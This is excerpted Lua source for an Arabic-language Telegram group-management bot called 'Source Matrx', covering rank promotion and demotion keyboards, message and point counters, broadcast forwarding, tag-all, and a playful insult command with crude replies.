keyboard.inline_keyboard = {{{text="• غنيلي •",callback_data="/Song:"..msg.sender_user_id_},{text="• اغنيه •",callback_data="/mp3:"..msg.sender_user_id_}},{{text="• متحركه •",callback_data="/gif:"..msg.sender_user_id_},{text="• صوره •",callback_data="/photo:"..msg.sender_user_id_}},{{text="• انمي •",callback_data="/anime:"..msg.sender_user_id_},{text="• ريمكس •",callback_data="/remix:"..msg.sender_user_id_}},{{text="• ميمز •",callback_data="/memz:"..msg.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..msg.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
Msg_id = msg.id_/2097152/0.5
...
keyboard = {} 
if Sudo(msg) then
keyboard.inline_keyboard = {{{text="• تنزيل مميز •",callback_data=msg.sender_user_id_..":RemMem:"..result.sender_user_id_},{text="• تنزيل ادمن •",callback_data=msg.sender_user_id_..":RemAdmin:"..result.sender_user_id_}},{{text="• تنزيل منشئ •",callback_data=msg.sender_user_id_..":RemConstructor:"..result.sender_user_id_},{text="• تنزيل مدير •",callback_data=msg.sender_user_id_..":RemManager:"..result.sender_user_id_}},{{text="• تنزيل منظف •",callback_data=msg.sender_user_id_..":RemCleaner:"..result.sender_user_id_},{text="• تنزيل منشئ  اساسي •",callback_data=msg.sender_user_id_..":RemBasicConstructor:"..result.sender_user_id_}},{{text="• تنزيل مالك •",callback_data=msg.sender_user_id_..":RemAbsConstructor:"..result.sender_user_id_},{text="• تنزيل مطور •",callback_data=msg.sender_user_id_..":RemSudoBot:"..result.sender_user_id_}},{{text="• تنزيل مطور ثانوي •",callback_data=msg.sender_user_id_..":RemSecondSudo:"..result.sender_user_id_},{text="• تنزيل مطور اساسي •",callback_data=msg.sender_user_id_..":RemRioSudo:"..result.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
elseif RioSudo(msg) then
keyboard.inline_keyboard = {{{text="• تنزيل مميز •",callback_data=msg.sender_user_id_..":RemMem:"..Rio},{text="• تنزيل ادمن •",callback_data=msg.sender_user_id_..":RemAdmin:"..Rio}},{{text="• تنزيل منشئ •",callback_data=msg.sender_user_id_..":RemConstructor:"..Rio},{text="• تنزيل مدير •",callback_data=msg.sender_user_id_..":RemManager:"..Rio}},{{text="• تنزيل منظف •",callback_data=msg.sender_user_id_..":RemCleaner:"..Rio},{text="• تنزيل منشئ  اساسي •",callback_data=msg.sender_user_id_..":RemBasicConstructor:"..Rio}},{{text="• تنزيل مالك •",callback_data=msg.sender_user_id_..":RemOwner:"..Rio},{text="• تنزيل مطور •",callback_data=msg.sender_user_id_..":RemSudoBot:"..Rio}},{{text="• تنزيل مطور ثانوي •",callback_data=msg.sender_user_id_..":RemSecondSudo:"..Rio}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
elseif SecondSudo(data) then
keyboard.inline_keyboard = {{{text="• تنزيل مميز •",callback_data=msg.sender_user_id_..":RemMem:"..Rio},{text="• تنزيل ادمن •",callback_data=msg.sender_user_id_..":RemAdmin:"..Rio}},{{text="• تنزيل منشئ •",callback_data=msg.sender_user_id_..":RemConstructor:"..Rio},{text="• تنزيل مدير •",callback_data=msg.sender_user_id_..":RemManager:"..Rio}},{{text="• تنزيل منظف •",callback_data=msg.sender_user_id_..":RemCleaner:"..Rio},{text="• تنزيل منشئ  اساسي •",callback_data=msg.sender_user_id_..":RemBasicConstructor:"..Rio}},{{text="• تنزيل مالك •",callback_data=msg.sender_user_id_..":RemOwner:"..Rio},{text="• تنزيل مطور •",callback_data=msg.sender_user_id_..":RemSudoBot:"..Rio}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
elseif SudoBot(data) then
keyboard.inline_keyboard = {{{text="• تنزيل مميز •",callback_data=msg.sender_user_id_..":RemMem:"..Rio},{text="• تنزيل ادمن •",callback_data=msg.sender_user_id_..":RemAdmin:"..Rio}},{{text="• تنزيل منشئ •",callback_data=msg.sender_user_id_..":RemConstructor:"..Rio},{text="• تنزيل مدير •",callback_data=msg.sender_user_id_..":RemManager:"..Rio}},{{text="• تنزيل منظف •",callback_data=msg.sender_user_id_..":RemCleaner:"..Rio},{text="• تنزيل منشئ  اساسي •",callback_data=msg.sender_user_id_..":RemBasicConstructor:"..Rio}},{{text="• تنزيل مالك •",callback_data=msg.sender_user_id_..":RemOwner:"..Rio}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
elseif Owner(data) then
keyboard.inline_keyboard = {{{text="• تنزيل مميز •",callback_data=msg.sender_user_id_..":RemMem:"..Rio},{text="• تنزيل ادمن •",callback_data=msg.sender_user_id_..":RemAdmin:"..Rio}},{{text="• تنزيل منشئ •",callback_data=msg.sender_user_id_..":RemConstructor:"..Rio},{text="• تنزيل مدير •",callback_data=msg.sender_user_id_..":RemManager:"..Rio}},{{text="• تنزيل منظف •",callback_data=msg.sender_user_id_..":RemCleaner:"..Rio},{text="• تنزيل منشئ  اساسي •",callback_data=msg.sender_user_id_..":RemBasicConstructor:"..Rio}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
elseif BasicConstructor(data) then
keyboard.inline_keyboard = {{{text="• تنزيل مميز •",callback_data=msg.sender_user_id_..":RemMem:"..Rio},{text="• تنزيل ادمن •",callback_data=msg.sender_user_id_..":RemAdmin:"..Rio}},{{text="• تنزيل منشئ •",callback_data=msg.sender_user_id_..":RemConstructor:"..Rio},{text="• تنزيل مدير •",callback_data=msg.sender_user_id_..":RemManager:"..Rio}},{{text="• تنزيل منظف •",callback_data=msg.sender_user_id_..":RemCleaner:"..Rio}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
elseif Constructor(data) then
keyboard.inline_keyboard = {{{text="• تنزيل مميز •",callback_data=msg.sender_user_id_..":RemMem:"..Rio},{text="• تنزيل ادمن •",callback_data=msg.sender_user_id_..":RemAdmin:"..Rio}},{{text="• تنزيل منظف •",callback_data=msg.sender_user_id_..":RemCleaner:"..Rio},{text="• تنزيل مدير •",callback_data=msg.sender_user_id_..":RemManager:"..Rio}},{{text = '• Matrx TeAM •',url="t.me/FZOFZ"}}}
elseif Manager(data) then
keyboard.inline_keyboard = {{{text="• تنزيل مميز •",callback_data=msg.sender_user_id_..":RemMem:"..Rio},{text="• تنزيل ادمن •",callback_data=msg.sender_user_id_..":RemAdmin:"..Rio}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
elseif Admin(data) then
keyboard.inline_keyboard = {{{text="• تنزيل مميز •",callback_data=msg.sender_user_id_..":RemMem:"..Rio}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
end
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text='..URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil)
...
--     Source Matrx     --
if text == "الرابط" then
local Link = DevRio:get(Matrx..'Rio:Link')
local Text = [[
*᥀︙اختر نوع الرابط لجلبه*
]] 
keyboard = {} 
keyboard.inline_keyboard = {{{text="• الرابط نص •",callback_data="/LinkText:"..msg.sender_user_id_},{text="• الرابط انلاين •",callback_data="/Linkinline:"..msg.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..msg.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
Msg_id = msg.id_/2097152/0.5
...
if not DevRio:get(Matrx..'Rio:Lock:Games'..msg.chat_id_) then
local Games = DevRio:get(Matrx..'Rio:Games')
local Text = [[
...
keyboard = {} 
keyboard.inline_keyboard = {{{text="• الالعاب المتطوره •",callback_data="/GameInline:"..msg.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..msg.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
Msg_id = msg.id_/2097152/0.5
...
DevRio0 = (DevRio:get(Matrx..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_) * 50)
DevRio:incrby(Matrx..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_,DevRio0)
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙تم بيع '..(DevRio:get(Matrx..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_))..' من نقاطك\n᥀︙كل نقطه تساوي 50 رساله', 'md')
DevRio:del(Matrx..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_)
end
end
--     Source Matrx     --
...
DevRio:sadd(Matrx..'Rio:BasicConstructor:'..msg.chat_id_,Manager_id)  
DevRio:sadd(Matrx..'Rio:RioConstructor:'..msg.chat_id_,Manager_id)   
end  
end  
if num == 0 then
...
local msguser = tonumber(DevRio:get(Matrx..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_))
local user_msgs = DevRio:get(Matrx..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local cont = (tonumber(DevRio:get(Matrx..'Rio:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
local user_nkt = tonumber(DevRio:get(Matrx..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)
if result.username_ then username = '@'..result.username_ else username = 'لا يوجد' end
...
DevRio:setex(Matrx..'DevRio4'..msg.sender_user_id_,360,true)
...
function MatrxTeam(extra,result,success)
if DevRio:get(Matrx.."Rio:Send:Bot"..Matrx) and not RioSudo(msg) then 
send(msg.chat_id_, msg.id_,"᥀︙الاذاعه معطله من قبل المطور الاساسي")
return false
end
local GpList = DevRio:smembers(Matrx.."Rio:Groups")
for k,v in pairs(GpList) do
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = result.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end
local PvList = DevRio:smembers(Matrx.."Rio:Users")
...
DevRio:set(Matrx..'Rio:viewget'..msg.sender_user_id_,true)
...
Text = [[
Welcome To Source
᥀︙[TeAm Matrx](https://t.me/FZOFZ)
]]
keyboard = {} 
keyboard.inline_keyboard = {{{text = '᥀ Source Channel',url="https://t.me/FZOFZ"}},{{text = '᥀ Developer',url="t.me/IIRIIRI"}}}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/FZOFZ&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
--     Source Matrx     --
if ChatType == 'sp' or ChatType == 'gp'  then
if text == "اطردني" and ChCheck(msg) or text == "ادفرني" and ChCheck(msg) then
if DevRio:get(Matrx.."Rio:Kick:Me"..msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙عذرا هذه الخاصيه معطله ', 1, 'md')
return false
end
DevRio:set(Matrx..'yes'..msg.sender_user_id_, 'delyes')
DevRio:set(Matrx..'no'..msg.sender_user_id_, 'delno')
...
DevRio:set(Matrx.."Rio:Kick:Me"..msg.chat_id_, true)
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل امر اطردني'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
end
if text == 'تفعيل اطردني' and Manager(msg) and ChCheck(msg) then
DevRio:del(Matrx.."Rio:Kick:Me"..msg.chat_id_)
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل امر اطردني'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
end
--     Source Matrx     --
if text == "نزلني" and ChCheck(msg) then
if DevRio:get(Matrx.."Rio:Del:Me"..msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙عذرا هذه الخاصيه معطله ', 1, 'md')
return false
end
DevRio:set(Matrx..'yesdel'..msg.sender_user_id_, 'delyes')
DevRio:set(Matrx..'nodel'..msg.sender_user_id_, 'delno')
...
DevRio:set(Matrx.."Rio:Del:Me"..msg.chat_id_, true)
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل امر نزلني'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
end
if text == 'تفعيل نزلني' and BasicConstructor(msg) and ChCheck(msg) then
DevRio:del(Matrx.."Rio:Del:Me"..msg.chat_id_)
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل امر نزلني'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
end
--     Source Matrx     --
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Matrx..'Rio:Lock:TagAll'..msg.chat_id_)
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Matrx..'Rio:Lock:TagAll'..msg.chat_id_,true)
end
if Admin(msg) then
if text == "تاك للكل" and ChCheck(msg) then
if not DevRio:get(Matrx..'Rio:Lock:TagAll'..msg.chat_id_) then
function TagAll(dp1,dp2)
local text = "᥀︙وينكم يالربع \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
i = 0
for k, v in pairs(dp2.members_) do
i = i + 1
if DevRio:get(Matrx..'Save:UserName'..v.user_id_) then
text = text..i.."~ : [@"..DevRio:get(Matrx..'Save:UserName'..v.user_id_).."]\n"
else
...
local EntryNumber = (DevRio:get(Matrx..'Rio:EntryNumber'..msg.chat_id_..':'..os.date('%d')) or 0)
local ExitNumber = (DevRio:get(Matrx..'Rio:ExitNumber'..msg.chat_id_..':'..os.date('%d')) or 0)
local MsgNumberDay = (DevRio:get(Matrx..'Rio:MsgNumberDay'..msg.chat_id_..':'..os.date('%d')) or 0)
...
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل تفاعلي'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Matrx..'Rio:msg:Rio'..msg.chat_id_) 
end
if text == "تفعيل تفاعلي" and Manager(msg) and ChCheck(msg) then
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل تفاعلي'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Matrx..'Rio:msg:Rio'..msg.chat_id_,true)  
end
if DevRio:get(Matrx.."Rio:msg:Rio"..msg.chat_id_) then
if msg.content_.ID then
get_msg = DevRio:get(Matrx.."Rio:msg:Rio"..msg.sender_user_id_..":"..msg.chat_id_) or 0
gms = get_msg + 1
DevRio:setex(Matrx..'Rio:msg:Rio'..msg.sender_user_id_..":"..msg.chat_id_,86400,gms)
end
...
function prom_reply(extra, result, success) 
get_msg = DevRio:get(Matrx.."Rio:msg:Rio"..result.sender_user_id_..":"..msg.chat_id_) or 0
...
--     Source Matrx     --
if text == "جهاتي" and ChCheck(msg) or text == "اضافاتي" and ChCheck(msg) then add = (tonumber(DevRio:get(Matrx..'Rio:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0) Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙عدد جهاتك المضافه ↫ *❨ "..add.." ❩* ", 1, 'md') end
if text == "تعديلاتي" or text == "سحكاتي" and ChCheck(msg) then local edit_msg = DevRio:get(Matrx..'Rio:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0  Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙عدد تعديلاتك ↫ *❨ "..edit_msg.." ❩* ", 1, 'md') end
...
if text == 'مسح جهاتي' or text == 'مسح اضافاتي' or text == 'حذف جهاتي' or text == 'حذف اضافاتي' then DevRio:del(Matrx..'Rio:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_) Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم حذف جميع جهاتك المضافه' , 1, 'md') end
--     Source Matrx     --
if text and text:match('^هينه @(.*)') and ChCheck(msg) or text and text:match('^هينها @(.*)') and ChCheck(msg) then 
if not DevRio:get(Matrx..'Rio:Lock:Stupid'..msg.chat_id_) then
...
if tonumber(result.id_) == tonumber(2075590328) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md') 
return false  
end  
if DevRio:sismember(Matrx.."Rio:RioConstructor:"..msg.chat_id_,result.id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
...
Dev_Rio(msg.chat_id_, result.id_, 1,''..MatrxTeam[math.random(#MatrxTeam)], 1, 'html') 
else  
...
if tonumber(result.sender_user_id_) == tonumber(2075590328) then  
Dev_Rio(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
if DevRio:sismember(Matrx.."Rio:RioConstructor:"..msg.chat_id_,result.sender_user_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
local MatrxTeam = "صارر ستاذيي 🏃🏻‍♂️♥️" 
...
Dev_Rio(msg.chat_id_, result.id_, 1,''..MatrxTeam[math.random(#MatrxTeam)], 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
...
if DevRio:sismember(Matrx..'Rio:RioSudo:',result.sender_user_id_) then
riosudo = 'المطورين الاساسيين • ' else riosudo = '' end
if DevRio:sismember(Matrx..'Rio:SecondSudo:',result.sender_user_id_) then
secondsudo = 'المطورين الثانويين • ' else secondsudo = '' end
if DevRio:sismember(Matrx..'Rio:SudoBot:',result.sender_user_id_) then
sudobot = 'المطورين • ' else sudobot = '' end
if DevRio:sismember(Matrx..'Rio:RioSudoGp:'..msg.chat_id_, result.sender_user_id_) then
riosudogp = 'مطورين اساسيين المجموعه • ' else riosudogp = '' end
if DevRio:sismember(Matrx..'Rio:SecondSudoGp:'..msg.chat_id_, result.sender_user_id_) then
secondsudogp = 'ثانويين المجموعه • ' else secondsudogp = '' end
if DevRio:sismember(Matrx..'Rio:SudoBotGp:'..msg.chat_id_, result.sender_user_id_) then
sudobotgp = 'مطورين المجموعه • ' else sudobotgp = '' end
if DevRio:sismember(Matrx..'Rio:Owner:'..msg.chat_id_, result.sender_user_id_) then
owner = 'المالكين • ' else owner = '' end
if DevRio:sismember(Matrx..'Rio:BasicConstructor:'..msg.chat_id_, result.sender_user_id_) then
basicconstructor = 'المنشئين الاساسيين • ' else basicconstructor = '' end
if DevRio:sismember(Matrx..'Rio:Constructor:'..msg.chat_id_, result.sender_user_id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if DevRio:sismember(Matrx..'Rio:Managers:'..msg.chat_id_, result.sender_user_id_) then
manager = 'المدراء • ' else manager = '' end
if DevRio:sismember(Matrx..'Rio:Admins:'..msg.chat_id_, result.sender_user_id_) then
admins = 'الادمنيه • ' else admins = '' end
if DevRio:sismember(Matrx..'Rio:VipMem:'..msg.chat_id_, result.sender_user_id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if DevRio:sismember(Matrx..'Rio:Cleaner:'..msg.chat_id_, result.sender_user_id_) then
...
DevRio:srem(Matrx..'Rio:RioSudo:', result.sender_user_id_)
DevRio:srem(Matrx..'Rio:SecondSudo:', result.sender_user_id_)
DevRio:srem(Matrx..'Rio:SudoBot:', result.sender_user_id_)
DevRio:srem(Matrx..'Rio:RioSudoGp:'..msg.chat_id_,result.sender_user_id_)
DevRio:srem(Matrx..'Rio:SecondSudoGp:'..msg.chat_id_,result.sender_user_id_)
DevRio:srem(Matrx..'Rio:SudoBotGp:'..msg.chat_id_,result.sender_user_id_)
DevRio:srem(Matrx..'Rio:Owner:'..msg.chat_id_,result.sender_user_id_)
DevRio:srem(Matrx..'Rio:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
DevRio:srem(Matrx..'Rio:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevRio:srem(Matrx..'Rio:Managers:'..msg.chat_id_, result.sender_user_id_)
DevRio:srem(Matrx..'Rio:Admins:'..msg.chat_id_, result.sender_user_id_)
DevRio:srem(Matrx..'Rio:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevRio:srem(Matrx..'Rio:Cleaner:'..msg.chat_id_, result.sender_user_id_)
...
if DevRio:sismember(Matrx..'Rio:RioSudo:',result.id_) then
Riosudo = 'المطورين الاساسيين • ' else Riosudo = '' end
if DevRio:sismember(Matrx..'Rio:SecondSudo:',result.id_) then
secondsudo = 'المطورين الثانويين • ' else secondsudo = '' end
if DevRio:sismember(Matrx..'Rio:SudoBot:',result.id_) then
sudobot = 'المطورين • ' else sudobot = '' end
if DevRio:sismember(Matrx..'Rio:RioSudoGp:'..msg.chat_id_, result.id_) then
riosudogp = 'مطورين اساسيين المجموعه • ' else riosudogp = '' end
if DevRio:sismember(Matrx..'Rio:SecondSudoGp:'..msg.chat_id_, result.id_) then
secondsudogp = 'ثانويين المجموعه • ' else secondsudogp = '' end
if DevRio:sismember(Matrx..'Rio:SudoBotGp:'..msg.chat_id_, result.id_) then
sudobotgp = 'مطورين المجموعه • ' else sudobotgp = '' end
if DevRio:sismember(Matrx..'Rio:Owner:'..msg.chat_id_, result.id_) then
owner = 'المالكين • ' else owner = '' end
if DevRio:sismember(Matrx..'Rio:BasicConstructor:'..msg.chat_id_, result.id_) then
basicconstructor = 'المنشئين الاساسيين • ' else basicconstructor = '' end
if DevRio:sismember(Matrx..'Rio:Constructor:'..msg.chat_id_, result.id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if DevRio:sismember(Matrx..'Rio:Managers:'..msg.chat_id_, result.id_) then
manager = 'المدراء • ' else manager = '' end
if DevRio:sismember(Matrx..'Rio:Admins:'..msg.chat_id_, result.id_) then
admins = 'الادمنيه • ' else admins = '' end
if DevRio:sismember(Matrx..'Rio:VipMem:'..msg.chat_id_, result.id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if DevRio:sismember(Matrx..'Rio:Cleaner:'..msg.chat_id_, result.id_) then
cleaner = 'المنظفين • ' else cleaner = ''
end
...
if RioDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudoid' then
DevRio:srem(Matrx..'Rio:RioSudo:', result.id_)
DevRio:srem(Matrx..'Rio:SecondSudo:', result.id_)
DevRio:srem(Matrx..'Rio:SudoBot:', result.id_)
DevRio:srem(Matrx..'Rio:RioSudoGp:'..msg.chat_id_,result.id_)
DevRio:srem(Matrx..'Rio:SecondSudoGp:'..msg.chat_id_,result.id_)
DevRio:srem(Matrx..'Rio:SudoBotGp:'..msg.chat_id_,result.id_)
DevRio:srem(Matrx..'Rio:Owner:'..msg.chat_id_,result.id_)
DevRio:srem(Matrx..'Rio:BasicConstructor:'..msg.chat_id_,result.id_)
DevRio:srem(Matrx..'Rio:Constructor:'..msg.chat_id_,result.id_)
DevRio:srem(Matrx..'Rio:Managers:'..msg.chat_id_, result.id_)
DevRio:srem(Matrx..'Rio:Admins:'..msg.chat_id_, result.id_)
DevRio:srem(Matrx..'Rio:VipMem:'..msg.chat_id_, result.id_)
DevRio:srem(Matrx..'Rio:Cleaner:'..msg.chat_id_, result.id_)
elseif RioDelAll(msg.sender_user_id_,msg.chat_id_) == 'riosudo' then
DevRio:srem(Matrx..'Rio:SecondSudo:', result.id_)
DevRio:srem(Matrx..'Rio:SudoBot:', result.id_)
DevRio:srem(Matrx..'Rio:RioSudoGp:'..msg.chat_id_,result.id_)
...
DevRio:sadd(Matrx..'Rio:RioSudo:',result.sender_user_id_)
...
if result.id_ then
DevRio:sadd(Matrx..'Rio:RioSudo:',result.id_)
...
DevRio:sadd(Matrx..'Rio:RioSudo:',user)
...
DevRio:srem(Matrx..'Rio:RioSudo:',user)
...
function sudo_reply(extra, result, success)
DevRio:sadd(Matrx..'Rio:SecondSudo:',result.sender_user_id_)
...
function promreply(extra,result,success)
if result.id_ then
DevRio:sadd(Matrx..'Rio:SecondSudo:',result.id_)
...
DevRio:sadd(Matrx..'Rio:SecondSudo:',user)
...
DevRio:srem(Matrx..'Rio:SecondSudo:',user)
...
function sudo_reply(extra, result, success)
DevRio:sadd(Matrx..'Rio:SudoBot:',result.sender_user_id_)
...
function promreply(extra,result,success)
if result.id_ then
DevRio:sadd(Matrx..'Rio:SudoBot:',result.id_)
...
DevRio:sadd(Matrx..'Rio:SudoBot:',user)
...
DevRio:srem(Matrx..'Rio:SudoBot:',user)
...
DevRio:sadd(Matrx..'Rio:RioSudoGp:'..msg.chat_id_,result.sender_user_id_)
...
function promreply(extra,result,success)
if result.id_ then
DevRio:sadd(Matrx..'Rio:RioSudoGp:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم رفعه مطور اساسي مجموعه")  
else 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
...
DevRio:sadd(Matrx..'Rio:RioSudoGp:'..msg.chat_id_,user)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم رفعه مطور اساسي مجموعه")  
end
--     Source Matrx     --
--  Rem RioSudoGp  --
...
DevRio:srem(Matrx..'Rio:RioSudoGp:'..msg.chat_id_,user)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم تنزيله مطور اساسي مجموعه")  
end end
...
function raf_reply(extra, result, success)
DevRio:sadd(Matrx..'Rio:SecondSudoGp:'..msg.chat_id_,result.sender_user_id_)
...
function promreply(extra,result,success)
if result.id_ then
DevRio:sadd(Matrx..'Rio:SecondSudoGp:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم رفعه مطور ثانوي مجموعه")  
else 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
...
DevRio:sadd(Matrx..'Rio:SecondSudoGp:'..msg.chat_id_,user)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم رفعه مطور ثانوي مجموعه")  
end
--     Source Matrx     --
--  Rem SecondSudoGp  --
...
DevRio:srem(Matrx..'Rio:SecondSudoGp:'..msg.chat_id_,user)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم تنزيله مطور ثانوي مجموعه")  
end end
...
function raf_reply(extra, result, success)
DevRio:sadd(Matrx..'Rio:SudoBotGp:'..msg.chat_id_,result.sender_user_id_)
...
function promreply(extra,result,success)
if result.id_ then
DevRio:sadd(Matrx..'Rio:SudoBotGp:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم رفعه مطور مجموعه")  
else 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
...
DevRio:sadd(Matrx..'Rio:SudoBotGp:'..msg.chat_id_,user)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم رفعه مطور مجموعه")  
end
--     Source Matrx     --
--  Rem SudoBotGp  --
...
DevRio:srem(Matrx..'Rio:SudoBotGp:'..msg.chat_id_,user)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم تنزيله مطور مجموعه")  
end end
...
function raf_reply(extra, result, success)
DevRio:sadd(Matrx..'Rio:Owner:'..msg.chat_id_,result.sender_user_id_)
...
function promreply(extra,result,success)
if result.id_ then
DevRio:sadd(Matrx..'Rio:Owner:'..msg.chat_id_,result.id_)
...
DevRio:sadd(Matrx..'Rio:Owner:'..msg.chat_id_,user)
...
DevRio:srem(Matrx..'Rio:Owner:'..msg.chat_id_,user)
...
function raf_reply(extra, result, success)
if not RioConstructor(msg) and DevRio:get(Matrx.."Rio:Lock:ProSet"..msg.chat_id_) then 
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
DevRio:sadd(Matrx..'Rio:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
...
if result.id_ then
DevRio:sadd(Matrx..'Rio:BasicConstructor:'..msg.chat_id_,result.id_)
...
DevRio:sadd(Matrx..'Rio:BasicConstructor:'..msg.chat_id_,user)
...
DevRio:srem(Matrx..'Rio:BasicConstructor:'..msg.chat_id_,user)
...
DevRio:sadd(Matrx..'Rio:Constructor:'..msg.chat_id_,result.sender_user_id_)
...
if result.id_ then
DevRio:sadd(Matrx..'Rio:Constructor:'..msg.chat_id_,result.id_)
...
DevRio:sadd(Matrx..'Rio:Constructor:'..msg.chat_id_,user)
...
DevRio:srem(Matrx..'Rio:Constructor:'..msg.chat_id_,user)
...
DevRio:sadd(Matrx..'Rio:Managers:'..msg.chat_id_,user)
...
DevRio:srem(Matrx..'Rio:Managers:'..msg.chat_id_,user)
...
DevRio:sadd(Matrx..'Rio:Cleaner:'..msg.chat_id_,result.sender_user_id_)
...
if result.id_ then
DevRio:sadd(Matrx..'Rio:Cleaner:'..msg.chat_id_,result.id_)
...
DevRio:sadd(Matrx..'Rio:Cleaner:'..msg.chat_id_,user)
...
DevRio:srem(Matrx..'Rio:Cleaner:'..msg.chat_id_,user)
...
